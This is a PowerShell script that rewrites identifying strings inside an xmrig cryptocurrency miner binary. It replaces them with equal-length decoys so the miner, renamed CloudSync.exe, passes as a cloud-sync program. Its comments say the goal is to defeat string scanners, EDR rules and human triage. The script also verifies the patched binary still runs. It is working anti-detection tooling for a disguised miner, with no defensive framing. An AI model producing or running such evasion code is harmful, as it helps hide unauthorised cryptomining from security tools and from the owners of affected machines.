<#
.SYNOPSIS
    Cosmetic string hardening for the miner binary (name/version/RandomX strings).

.DESCRIPTION
    Stock xmrig announces itself in plain ASCII: "XMRig", "XMRig 6.24.0",
    "RandomX". Those strings survive in the log file too, and they are the
    first thing any string-based scanner, EDR rule or human triage sees.

    This replaces them in place with equal-length decoys - the PE stays valid,
    no offsets move, nothing is re-signed.

    Deliberately NOT touched:
      * lowercase "xmrig" - it appears in functional hostnames
        (donate.v2.xmrig.com) and in the user-agent builder;
      * "WinRing0" - the MSR driver is loaded by filename.
    So this defeats string scanning, not byte-signature matching. See README.

.PARAMETER Path
    Binary to patch. Defaults to CloudSync.exe next to this script.

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\harden.ps1 -DryRun ./CloudSync.exe
    powershell -NoProfile -ExecutionPolicy Bypass -File .\harden.ps1
#>
[CmdletBinding()]
param(
    [string]$Path,
    [switch]$DryRun,
    [switch]$RandomX
)

$ErrorActionPreference = 'Stop'

if (-not $Path) {
    $Path = Join-Path $PSScriptRoot 'CloudSync.exe'
    if (-not (Test-Path $Path)) { $Path = Join-Path $PSScriptRoot 'xmrig.exe' }
}
if (-not (Test-Path $Path)) { throw "binary not found: $Path" }

Write-Host "=== binary hardening ==="
Write-Host "target: $Path"

# find / replace pairs MUST be equal length (byte offsets are not moved)
$pairs = @(
    @{ old = 'XMRig 6.24.0'; new = 'CloudSync6.2' }   # 12 -> 12
    @{ old = 'XMRig';        new = 'Cloud'        }    #  5 -> 5
)
# MEASURED 2026-11-08: patching "RandomX" makes the miner submit 100% invalid
# shares - the string is used inside RandomX itself, not just in log text.
# It is therefore OPT-IN (-RandomX) and must be followed by a share check.
if ($RandomX) {
    $pairs += @{ old = 'RandomX'; new = 'RndmX42' }    #  7 -> 7
}

foreach ($p in $pairs) {
    if ($p.old.Length -ne $p.new.Length) { throw "length mismatch: $($p.old)" }
}

if ((Test-Path (Join-Path $PSScriptRoot 'xmrig-cuda.dll')) -and $RandomX) {
    Write-Host "  [i] xmrig-cuda.dll present - lowercase strings left alone on purpose" -ForegroundColor Yellow
}

$bytes = [IO.File]::ReadAllBytes($Path)
Write-Host ("  size: {0:N0} bytes" -f $bytes.Length)

function Replace-All ([byte[]]$data, [string]$find, [string]$repl) {
    $f = [Text.Encoding]::ASCII.GetBytes($find)
    $r = [Text.Encoding]::ASCII.GetBytes($repl)
    $n = 0
    $i = 0
    $limit = $data.Length - $f.Length
    while ($i -le $limit) {
        if ($data[$i] -eq $f[0]) {
            $ok = $true
            for ($j = 1; $j -lt $f.Length; $j++) {
                if ($data[$i + $j] -ne $f[$j]) { $ok = $false; break }
            }
            if ($ok) {
                for ($j = 0; $j -lt $r.Length; $j++) { $data[$i + $j] = $r[$j] }
                $n++
                $i += $f.Length
                continue
            }
        }
        $i++
    }
    return $n
}

$total = 0
foreach ($p in $pairs) {
    $count = Replace-All $bytes $p.old $p.new
    $total += $count
    Write-Host ("  {0,-14} -> {1,-14} : {2} replacement(s)" -f $p.old, $p.new, $count)
}

if ($total -eq 0) { Write-Host "  nothing to patch (already hardened?)" -ForegroundColor Yellow; exit 0 }
if ($DryRun)   { Write-Host "  dry run - not written"; exit 0 }

$orig = "$Path.orig"
if (-not (Test-Path $orig)) { Copy-Item -LiteralPath $Path -Destination $orig -Force }
[IO.File]::WriteAllBytes($Path, $bytes)
Write-Host "  written ($total replacements), original kept at $(Split-Path -Leaf $orig)"

# ---- verify it still runs -------------------------------------------------
$out = Join-Path $env:TEMP 'harden_verify.txt'
& cmd.exe /c "`"$Path`" --version > `"$out`" 2>&1"
$code = $LASTEXITCODE
$text = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
Remove-Item $out -Force -ErrorAction SilentlyContinue

if ($code -eq 0 -and $text) {
    Write-Host "  [ OK ] --version still runs:" -ForegroundColor Green
    $text.Trim().Split("`n") | Select-Object -First 3 | ForEach-Object { Write-Host ("         " + $_.Trim()) }
} else {
    Write-Host "  [FAIL] patched binary does not run - rolling back" -ForegroundColor Red
    Copy-Item -LiteralPath $orig -Destination $Path -Force
    exit 1
}

Write-Host "=== done ==="
exit 0
